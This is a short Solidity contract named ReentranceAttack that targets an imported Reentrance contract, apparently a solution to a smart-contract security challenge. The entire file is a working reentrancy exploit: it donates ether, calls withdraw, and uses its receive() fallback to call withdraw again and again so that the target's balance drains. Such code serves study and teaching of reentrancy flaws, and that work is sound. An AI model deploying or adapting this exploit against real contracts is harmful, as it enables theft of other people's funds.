// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract ReentranceAttack {
    Reentrance public reentranceContract;

    constructor(address _reentranceContract) public {
        reentranceContract = Reentrance(payable(_reentranceContract));
    }

    function attack() public payable {
        require(msg.value > 0, "donate something!");
        reentranceContract.donate{value: msg.value}(address(this));
        reentranceContract.withdraw(msg.value);
    }

    receive() external payable {
        reentranceContract.withdraw(msg.value);
    }
}
